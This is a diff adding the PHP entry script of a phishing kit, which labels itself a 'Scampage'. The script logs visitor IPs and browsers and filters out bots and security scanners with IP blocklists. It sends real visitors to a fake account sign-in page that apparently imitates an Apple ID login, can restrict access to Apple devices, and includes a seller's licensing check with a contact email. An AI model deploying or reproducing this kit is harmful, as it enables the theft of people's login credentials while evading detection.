@@ -1,0 +1,97 @@
+ <?php
+date_default_timezone_set("Asia/Jakarta");
+session_start();
+$setting = parse_ini_file("config.ini");
+include "security/block1.php";
+include "security/block2.php";
+include "block3.php";
+include "main.php";
+include "proxyblock.php";
+include "load.php";
+$random_id       = sha1(rand(0, 1000000));
+$link            = array(
+    "https://anon.to/Y1iB66",
+    "https://anon.to/afVZdc",
+    "https://anon.to/PBrSr6",
+    "https://anon.to/Fecp5D",
+    "https://anon.to/gq6XD7",
+    "https://anon.to/sEEHtD",
+    "https://anon.to/Azckkg",
+    "https://anon.to/NZg2yW",
+    "https://anon.to/FwZxcD",
+    "https://anon.to/gvQ0Iu",
+    "https://anon.to/tqD7DD",
+    "https://anon.to/J4Uti3"
+);
+$random          = rand(0, 11);
+$link            = $link[$random];
+$_SESSION["key"] = $key;
+$home            = "account";
+$url             = $_SERVER["REQUEST_URI"];
+$browsers        = getBrowser();
+$key             = substr(md5($ip2), 0, 15);
+$iplogfile       = "visite.log";
+$ipaddress       = $_SERVER["REMOTE_ADDR"];
+$webpage         = $_SERVER["SCRIPT_NAME"];
+$timestamp       = date("m/d/Y h:i:s");
+$browser         = $_SERVER["HTTP_USER_AGENT"];
+$fp              = fopen($iplogfile, "a+");
+chmod($iplogfile, 0777);
+fwrite($fp, "[" . $timestamp . "]: " . $ipaddress . " " . $browser . "
+");
+fclose($fp);
+$click = fopen("result/total_click.txt", "a");
+fwrite($click, "$ip2" . "
+");
+fclose($click);
+if ($valdo == "valid") {
+    if (isset($_GET[$param])) {
+        $click = fopen("result/log_visitor.txt", "a");
+        $jam   = date("h:i:sa");
+        fwrite($click, "[$jam - $ip2 - $cn - $br - $os] Mengunjungi Scampage" . "
+");
+        fclose($click);
+        header("location: $home/?view=login&appIdKey=" . $key . "&login&path=/signin/?referrer&country=" . $cid . "#");
+        exit;
+    } else {
+        $click = fopen("result/total_bot.txt", "a");
+        fwrite($click, "$ip2 (Detect by IP Blacklist)" . "
+");
+        fclose($click);
+        $click = fopen("result/log_visitor.txt", "a");
+        $jam   = date("h:i:sa");
+        fwrite($click, "[$jam - $ip2 - $cn - $br - $os] Gagal Masuk Parameter" . "
+");
+        fclose($click);
+        header("location: $link");
+        exit;
+    }
+    $filename = "result/total_click.txt";
+    $fp       = fopen($filename, "r");
+    $content  = fread($fp, filesize($filename));
+    fclose($fp);
+    $string = $content;
+    $total  = substr_count($string, "
+");
+    if ($total > 2) {
+        header("location: $link");
+        exit;
+    } else {
+        echo "<script type='text/javascript'>window.top.location='$home/?view=login&appIdKey=" . $key . "&login&path=/signin/?referrer&country=" . $cid . "';</script>";
+    }
+    if ($lockos == 1) {
+        if ($os == "iPhone" or $os == "iPad" or $os == "iPod" or $os == "Mac OS X" or $os == "Mac OS 9") {
+        } else {
+            $click = fopen("result/log_visitor.txt", "a");
+            $jam   = date("h:i:sa");
+            fwrite($click, "[$jam - $ip2 - $cn - $br - $os] Not Apple" . "
+");
+            fclose($click);
+            header("location: $link");
+            exit;
+        }
+    }
+} else {
+    echo "%3Cscript%20language%3Djavascript%3Edocument.write%28unescape%28%27%3Ctitle%3EKEY%20INVALID%20%21%3C/title%3E%0A%09%3Cstyle%3E%0A%09body%20%7B%20%0A%09background-color%3A%20%23000%3B%0A%09color%3A%20%23ccc%3B%0A%09%7D%0A%09%3C/style%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%0A%09%3Ccenter%3E%3Cfont%20style%3D%22font-family%3A%20Verdana%3Bfont-size%3A%2070px%3Bcolor%3A%20%23c10000%22%3EDomain%20Not%20Activated%20%21%3C/font%3E%0A%09%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%0A%09%3Cp%20style%3D%22font-family%3A%20Consolas%3Bfont-size%3A%2020px%3B%22%3EPlease%20Activated%20Your%20Domain%20%21%3C/p%3E%3C/center%3E%0A%09%3Ccenter%3E%0A%09%3Cfont%20face%3D%22calibri%22%20size%3D%225%22%3EContact%20Me%3A%20%3Ca%20style%3D%22text-decoration%3A%20none%3Bcolor%3A%20%230011ff%3B%22%20href%3D%22mailto%3Adexodese1s@yandex.com%22%3Emailto%3Adexodese1s@yandex.com%3C/a%3E%3C/font%3E%3C/center%3E%27%29%29%3C/script%3E";
+}
+?> 
